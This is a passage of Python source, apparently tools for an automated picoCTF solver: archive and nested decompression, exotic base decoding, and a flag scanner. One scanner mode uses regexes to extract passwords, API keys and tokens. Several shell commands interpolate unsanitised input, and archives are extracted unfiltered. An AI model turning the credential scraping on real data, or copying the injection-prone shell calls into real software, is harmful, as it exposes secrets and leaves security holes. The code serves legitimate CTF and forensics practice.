                      output_dir: str = "", max_depth: int = 10,
                      data_hex: str = "") -> str:
    """Multi-format decompression using 7z + unar + Python stdlib.
    Ops: detect (identify compression type from magic bytes),
    decompress (extract using best available tool),
    nested_extract (recursive decompression — handles 'file-in-file-in-file' chains),
    try_all (try every decompressor until one succeeds),
    list_contents (list archive contents without extracting)."""

    sp = (_w2l(file_path) if (IS_WINDOWS and USE_WSL) else file_path) if file_path else ""
    od = output_dir or f"/tmp/decompress_{int(time.time())}"
    _shell(f"mkdir -p '{od}'")

    if operation == "detect":
        file_out = _shell(f"file '{sp}' 2>&1", timeout=5) if sp else ""
        code = f"""
import binascii
path = {repr(sp)}
data_hex = {repr(data_hex)}
if path:
    with open(path, 'rb') as f: data = f.read(16)
else:
    data = binascii.unhexlify(data_hex[:32]) if data_hex else b''

magic_map = {{
    b'\\x1f\\x8b': 'gzip',
    b'BZh': 'bzip2',
    b'\\xfd7zXZ': 'xz/lzma',
    b'PK\\x03\\x04': 'zip',
    b'Rar!': 'rar',
    b'7z\\xbc\\xaf': '7-zip',
    b'\\x1f\\x9d': 'compress (.Z)',
    b'\\x04\\x22\\x4d\\x18': 'lz4',
    b'\\x28\\xb5\\x2f\\xfd': 'zstd',
    b'\\x89PNG': 'png',
    b'\\xff\\xd8\\xff': 'jpeg',
    b'GIF8': 'gif',
    b'\\x7fELF': 'elf',
    b'MZ': 'pe/exe',
    b'%PDF': 'pdf',
}}
for sig, name in magic_map.items():
    if data[:len(sig)] == sig:
        print(f'Detected: {{name}} ({{}})'.format(sig.hex()))
        break
else:
    print(f'Unknown: {{data[:8].hex()}}')
"""
        return (f"file: {file_out}\n" if file_out else "") + tool_execute_python(code, timeout=5)

    if operation in ("decompress", "list_contents"):
        action = "l" if operation == "list_contents" else f"x -o'{od}'"
        out = _shell(f"7z {action} '{sp}' 2>&1 | head -40", timeout=30)
        if "not found" in out:
            out = _shell(f"unar -o '{od}' '{sp}' 2>&1 | head -30", timeout=30)
        if "not found" in out:
            # Python stdlib fallback
            code = f"""
import gzip, bz2, lzma, zipfile, tarfile, os
sp = {repr(sp)}
od = {repr(od)}
try:
    if sp.endswith('.gz') or sp.endswith('.tgz'):
        with gzip.open(sp, 'rb') as f: data = f.read()
        out = sp.replace('.gz','').replace('.tgz','.tar')
        open(os.path.join(od, os.path.basename(out)),'wb').write(data)
        print(f'Extracted gzip: {{len(data)}} bytes')
    elif sp.endswith('.bz2'):
        with bz2.open(sp,'rb') as f: data = f.read()
        open(os.path.join(od,os.path.basename(sp[:-4])),'wb').write(data)
        print(f'Extracted bz2: {{len(data)}} bytes')
    elif sp.endswith('.xz') or sp.endswith('.lzma'):
        with lzma.open(sp,'rb') as f: data = f.read()
        open(os.path.join(od,os.path.basename(sp[:-3])),'wb').write(data)
        print(f'Extracted xz/lzma: {{len(data)}} bytes')
    elif zipfile.is_zipfile(sp):
        with zipfile.ZipFile(sp) as z: z.extractall(od); print(f'Extracted zip: {{z.namelist()}}')
    elif tarfile.is_tarfile(sp):
        with tarfile.open(sp) as t: t.extractall(od); print(f'Extracted tar: {{t.getnames()[:10]}}')
    else:
        print(f'No matching Python extractor for {{sp}}')
except Exception as ex:
    print(f'Error: {{ex}}')
"""
            out = tool_execute_python(code, timeout=20)
        return out

    if operation == "nested_extract":
        code = f"""
import subprocess, os, shutil

def decompress_one(path, outdir):
    os.makedirs(outdir, exist_ok=True)
    r = subprocess.run(['7z', 'x', '-y', f'-o{{outdir}}', path],
                       capture_output=True, text=True, timeout=30)
    if r.returncode != 0:
        r2 = subprocess.run(['unar', '-o', outdir, path], capture_output=True, text=True, timeout=30)
        return r2.returncode == 0
    return True

current = [{repr(sp)}]
depth = 0
max_depth = {max_depth}
found_flag = False

while current and depth < max_depth:
    depth += 1
    next_files = []
    print(f'\\n=== Depth {{depth}} ===')
    for f in current:
        outdir = f'{repr(od)}/depth_{{depth}}_{{os.path.basename(f)}}'
        print(f'Extracting: {{f}}')
        ok = decompress_one(f, outdir)
        if ok:
            for root, dirs, files in os.walk(outdir):
                for fname in files:
                    fp = os.path.join(root, fname)
                    print(f'  -> {{fp}}')
                    # Check for flag
                    try:
                        content = open(fp,'rb').read(1000).decode(errors='replace')
                        if 'picoCTF' in content or 'flag{{' in content.lower():
                            print(f'[!] FLAG FOUND: {{content[:200]}}')
                            found_flag = True
                    except: pass
                    next_files.append(fp)
        else:
            print(f'  (not an archive)')
    current = [f for f in next_files if any(f.endswith(e) for e in
               ['.gz','.bz2','.xz','.zip','.tar','.rar','.7z','.lzma','.Z','.zst'])]

if not found_flag:
    print(f'\\nNo flag found after {{depth}} levels of extraction')
"""
        return tool_execute_python(code, timeout=120)

    if operation == "try_all":
        results = []
        for fmt_cmd in [f"gzip -d -k '{sp}' -c", f"bzip2 -d -k '{sp}' -c",
                        f"7z x -y -o'{od}' '{sp}'"]:
            out = _shell(f"{fmt_cmd} 2>&1 | head -10", timeout=15)
            if "error" not in out.lower()[:20] and "not found" not in out:
                results.append(f"[{fmt_cmd.split()[0]}] {out[:100]}")
        return "\n".join(results) if results else _shell(f"7z x -y -o'{od}' '{sp}' 2>&1", timeout=30)

    return "Operations: detect, decompress, nested_extract, try_all, list_contents"


def tool_number_bases(text: str, operation: str = "auto",
                       alphabet: str = "", direction: str = "decode") -> str:
    """Extended base encoding/decoding wrapping basecrack + pure Python implementations.
    Ops: auto (basecrack auto-detect and decode — handles base16/32/36/58/62/64/85/91/92),
    base85 (ASCII85 / btoa decode/encode),
    base91 (base91 decode/encode),
    base36 (base36 decode/encode),
    custom_b64 (base64 with non-standard alphabet),
    baudot (Baudot/ITA2 telegraph code),
    gray_code (Gray/reflected binary code conversion),
    dna (DNA encoding ACGT → binary → ASCII),
    bcd (Binary-Coded Decimal decode)."""

    if operation == "auto":
        # Try basecrack first
        result = _shell(f"basecrack '{text}' 2>&1", timeout=10)
        if "not found" in result or "command not found" in result:
            result = _shell(f"python3 -m basecrack '{text}' 2>&1", timeout=10)
        if "not found" not in result and "No module" not in result:
            return result
        # Fallback: try common bases with Python
        code = f"""
import base64, binascii
text = {repr(text.strip())}
results = []
for b,fn in [
    ('base64',   lambda t: base64.b64decode(t+'=='*((4-len(t)%4)%4)).decode(errors='replace')),
    ('base32',   lambda t: base64.b32decode(t.upper()+'='*((8-len(t)%8)%8)).decode(errors='replace')),
    ('base16',   lambda t: binascii.unhexlify(t).decode(errors='replace')),
    ('base85',   lambda t: base64.b85decode(t).decode(errors='replace')),
    ('ascii85',  lambda t: base64.a85decode(t).decode(errors='replace')),
]:
    try:
        dec = fn(text)
        if all(32<=ord(c)<=126 or c in '\\n\\t' for c in dec[:20]):
            results.append(f'{{b}}: {{dec[:100]}}')
    except: pass
if results:
    print('\\n'.join(results))
else:
    print('Could not auto-decode. Install basecrack: pip install basecrack')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "base85":
        code = f"""
import base64
t = {repr(text)}
d = {repr(direction)}
try:
    if d == 'decode':
        # Try both btoa (a85) and base85 (b85)
        try: print('a85decode:', base64.a85decode(t).decode(errors='replace'))
        except Exception as e: print(f'a85 failed: {{e}}')
        try: print('b85decode:', base64.b85decode(t).decode(errors='replace'))
        except Exception as e: print(f'b85 failed: {{e}}')
    else:
        print('a85encode:', base64.a85encode(t.encode()).decode())
        print('b85encode:', base64.b85encode(t.encode()).decode())
except Exception as ex:
    print(f'Error: {{ex}}')
"""
        return tool_execute_python(code, timeout=5)

    if operation == "base91":
        code = f"""
# base91 pure Python (no install needed)
ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{{|}}~"'
def b91_decode(data):
    v = -1; b = 0; n = 0; o = bytearray()
    for c in data:
        p = ALPHABET.find(c)
        if p == -1: continue
        if v < 0: v = p
        else:
            v += p * 91; b |= v << n; n += 13 if (v & 8191) > 88 else 14
            v = -1
            while n > 7:
                o.append(b & 255); b >>= 8; n -= 8
    if v > -1: o.append((b | v << n) & 255)
    return bytes(o)

def b91_encode(data):
    b = 0; n = 0; o = ''
    for byte in data:
        b |= byte << n; n += 8
        if n > 13:
            v = b & 8191
            if v > 88: b >>= 13; n -= 13
            else: v = b & 16383; b >>= 14; n -= 14
            o += ALPHABET[v % 91] + ALPHABET[v // 91]
    if n: o += ALPHABET[b % 91] + (ALPHABET[b // 91] if n > 7 or b > 90 else '')
    return o

t = {repr(text)}
if {repr(direction)} == 'decode':
    result = b91_decode(t)
    print('Decoded:', result.decode(errors='replace'))
    print('Hex:', result.hex())
else:
    print('Encoded:', b91_encode(t.encode()))
"""
        return tool_execute_python(code, timeout=5)

    if operation == "gray_code":
        code = f"""
def gray_to_bin(n): return n ^ (n >> 1) if isinstance(n,int) else int(bin(int(n,2))[2:],2)
def bin_to_gray(n): return n ^ (n >> 1)
# Treat text as binary string
t = {repr(text)}.replace(' ','')
if all(c in '01' for c in t):
    # Decode Gray code bit by bit
    gray_int = int(t, 2)
    mask = gray_int >> 1
    result = gray_int
    while mask:
        result ^= mask
        mask >>= 1
    print(f'Gray {{t}} → binary {{bin(result)[2:].zfill(len(t))}} = {{result}}')
    # As ASCII
    bits = bin(result)[2:].zfill(len(t))
    if len(bits) % 8 == 0:
        text_out = ''.join(chr(int(bits[i:i+8],2)) for i in range(0,len(bits),8))
        print(f'As ASCII: {{text_out}}')
else:
    try:
        n = int(t)
        print(f'Gray code of {{n}}: {{n ^ (n >> 1)}}')
    except:
        print('Provide binary string or integer')
"""
        return tool_execute_python(code, timeout=5)

    if operation == "dna":
        code = f"""
t = {repr(text.upper().replace(' ',''))}
d = {repr(direction)}
# Common DNA encodings
encodings = {{
    'ACGT': {{'A':'00','C':'01','G':'10','T':'11'}},
    'AGTC': {{'A':'00','G':'01','T':'10','C':'11'}},
    'CATG': {{'C':'00','A':'01','T':'10','G':'11'}},
}}
if d == 'decode':
    for name, mapping in encodings.items():
        try:
            bits = ''.join(mapping.get(c,'') for c in t)
            if len(bits) % 8 == 0:
                text_out = ''.join(chr(int(bits[i:i+8],2)) for i in range(0,len(bits),8))
                printable = all(32<=ord(c)<=126 for c in text_out)
                if printable:
                    print(f'{{name}} encoding: {{text_out}}')
        except: pass
else:
    enc = encodings['ACGT']
    rev = {{v:k for k,v in enc.items()}}
    bits = ''.join(f'{{ord(c):08b}}' for c in t)
    dna = ''.join(rev.get(bits[i:i+2],'?') for i in range(0,len(bits),2))
    print(f'DNA (ACGT): {{dna}}')
"""
        return tool_execute_python(code, timeout=5)

    if operation == "custom_b64":
        if not alphabet: return "Provide alphabet= (64 chars for base64 variant)"
        code = f"""
import base64
std = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
custom = {repr(alphabet)}
t = {repr(text)}
d = {repr(direction)}
if d == 'decode':
    # Translate from custom alphabet to standard
    table = str.maketrans(custom + '=', std + '=')
    std_text = t.translate(table)
    std_text += '='*((4-len(std_text)%4)%4)
    result = base64.b64decode(std_text)
    print('Decoded:', result.decode(errors='replace'))
    print('Hex:', result.hex())
else:
    encoded = base64.b64encode(t.encode()).decode()
    table = str.maketrans(std, custom)
    print('Encoded:', encoded.translate(table))
"""
        return tool_execute_python(code, timeout=5)

    if operation == "baudot":
        code = f"""
# Baudot / ITA2 code
BAUDOT = {{0:'\\x00',1:'E',2:'\\n',3:'A',4:' ',5:'S',6:'I',7:'U',8:'\\r',9:'D',
           10:'R',11:'J',12:'N',13:'F',14:'C',15:'K',16:'T',17:'Z',18:'L',19:'W',
           20:'H',21:'Y',22:'P',23:'Q',24:'O',25:'B',26:'G',27:'FIG',28:'M',29:'X',
           30:'V',31:'LET'}}
BAUDOT_FIG = {{0:'\\x00',1:'3',2:'\\n',3:'-',4:' ',5:"'",6:'8',7:'7',8:'\\r',9:'ENQ',
              10:'4',11:'\\x07',12:',',13:'!',14:':',15:'(',16:'5',17:'"',18:')',19:'2',
              20:'#',21:'6',22:'0',23:'1',24:'9',25:'?',26:'&',27:'FIG',28:'.',29:'/',
              30:';',31:'LET'}}
t = {repr(text)}.replace(' ','')
result = ''
fig = False
for i in range(0,len(t)-4,5):
    code_val = int(t[i:i+5],2)
    if BAUDOT.get(code_val) == 'FIG': fig = True
    elif BAUDOT.get(code_val) == 'LET': fig = False
    else:
        char = BAUDOT_FIG.get(code_val,'?') if fig else BAUDOT.get(code_val,'?')
        result += char
print(f'Baudot decoded: {{result}}')
"""
        return tool_execute_python(code, timeout=5)

    if operation == "bcd":
        code = f"""
t = {repr(text.replace(' ','').replace(':',''))}
result = ''
for i in range(0,len(t)-1,2):
    high = int(t[i],16)
    low  = int(t[i+1],16)
    if high > 9 or low > 9:
        result += f'{{t[i]}}{{t[i+1]}}'
    else:
        result += str(high*10+low)
print(f'BCD decoded: {{result}}')
try:
    import binascii
    raw = binascii.unhexlify(t)
    bcd_chars = ''.join(chr(b) if 32<=b<=126 else '.' for b in raw)
    print(f'Raw bytes: {{bcd_chars}}')
except: pass
"""
        return tool_execute_python(code, timeout=5)

    return "Operations: auto, base85, base91, base36, custom_b64, baudot, gray_code, dna, bcd"


def tool_flag_extractor(text: str = "", file_path: str = "",
                         ctf_name: str = "picoCTF",
                         operation: str = "scan",
                         patterns: list = None) -> str:
    """Scan any text or file for flag patterns, encoded flags, credentials, and interesting data.
    Ops: scan (find all flag patterns + common encodings of flag),
    find_encoded (try to decode every base64/hex/rot/url chunk and check for flag),
    find_credentials (extract username:password, API keys, tokens, secrets),
    interesting (find URLs, IPs, emails, hashes, and printable clusters > 6 chars),
    strings_flag (run strings on binary and grep for flag patterns)."""

    if file_path:
        sp = (_w2l(file_path) if (IS_WINDOWS and USE_WSL) else file_path)
        try:
            with open(sp, "rb") as f:
                raw = f.read()
            text = raw.decode("utf-8", errors="replace")
        except Exception as ex:
            return f"Cannot read {file_path}: {ex}"

    if not text:
        return "Provide text= or file_path="

    code = f"""
import re, base64, binascii, urllib.parse

text = {repr(text[:100000])}  # cap at 100KB
ctf = {repr(ctf_name)}
op = {repr(operation)}
extra_patterns = {repr(patterns or [])}

# Build flag regex patterns
flag_re = [
    rf'{{re.escape(ctf)}}{{{{[^}}]+}}}}',  # picoCTF{{...}}
    r'flag{{[^}}]+}}',
    r'CTF{{[^}}]+}}',
    r'[A-Z]{{3,8}}_?{{[^}}]{{5,50}}}}',   # generic CTF{{...}}
]
flag_re += extra_patterns

all_found = []

if op in ('scan', 'find_encoded', 'interesting', 'find_credentials'):
    # Direct flag search
    for pat in flag_re:
        for m in re.finditer(pat, text, re.IGNORECASE):
            all_found.append(('DIRECT', m.group()))

if op in ('scan', 'find_encoded'):
    # Try to decode every base64 chunk
    for chunk in re.findall(r'[A-Za-z0-9+/]{{20,}}={{0,2}}', text):
        try:
            dec = base64.b64decode(chunk+'==').decode(errors='replace')
            for pat in flag_re:
                if re.search(pat, dec, re.IGNORECASE):
                    all_found.append(('BASE64', f'{{chunk}} → {{dec[:100]}}'))
        except: pass

    # Try hex decode
    for chunk in re.findall(r'[0-9a-fA-F]{{16,}}', text):
        try:
            dec = binascii.unhexlify(chunk).decode(errors='replace')
            for pat in flag_re:
                if re.search(pat, dec, re.IGNORECASE):
                    all_found.append(('HEX', f'{{chunk}} → {{dec[:100]}}'))
        except: pass

    # Try URL decode
    if '%' in text:
        dec = urllib.parse.unquote(text)
        for pat in flag_re:
            for m in re.finditer(pat, dec, re.IGNORECASE):
                all_found.append(('URL_DECODED', m.group()))

    # Try ROT13
    import codecs
    rot = codecs.encode(text, 'rot_13')
    for pat in flag_re:
        for m in re.finditer(pat, rot, re.IGNORECASE):
            all_found.append(('ROT13', m.group()))

if op in ('find_credentials', 'interesting'):
    # Credentials
    for m in re.finditer(r'(?:password|passwd|secret|token|api_key|apikey)[\\s:=]+([^\\s,;{{}}\\n]{{4,60}})', text, re.IGNORECASE):
        all_found.append(('CREDENTIAL', m.group()[:80]))
    for m in re.finditer(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\\.[a-zA-Z]{{2,}}', text):
        all_found.append(('EMAIL', m.group()))
    for m in re.finditer(r'(?:Bearer|Token|Key)\\s+([A-Za-z0-9_.-]{{20,}})', text, re.IGNORECASE):
        all_found.append(('TOKEN', m.group()[:80]))

if op == 'interesting':
    for m in re.finditer(r'https?://[^\\s<>"{{}}|\\\\^`]{{5,100}}', text):
        all_found.append(('URL', m.group()))
    for m in re.finditer(r'\\b(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]\\d|\\d)(?:\\.(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]\\d|\\d)){{3}}\\b', text):
        all_found.append(('IP', m.group()))
    for m in re.finditer(r'[0-9a-fA-F]{{32,64}}', text):
        all_found.append(('HASH_OR_HEX', m.group()[:64]))

# Deduplicate and print
seen = set()
total = 0
for category, value in all_found:
    key = f'{{category}}:{{value}}'
    if key not in seen:
        seen.add(key)
        print(f'[{{category}}] {{value[:120]}}')
        total += 1

print(f'\\nTotal: {{total}} findings')
if total == 0:
    print('No flags or interesting patterns found')
    print(f'Text length: {{len(text)}} chars')
"""
    return tool_execute_python(code, timeout=20)




# ─── Entry ────────────────────────────────────────────────────────────────────
def main():
    try: payload=json.loads(sys.stdin.read())
    except Exception as e:
        log("err",f"Input error: {e}","red"); result("failed"); return
    if payload.get("mode")=="import": run_import(payload)
    else: run_solve(payload)

if __name__=="__main__": main()
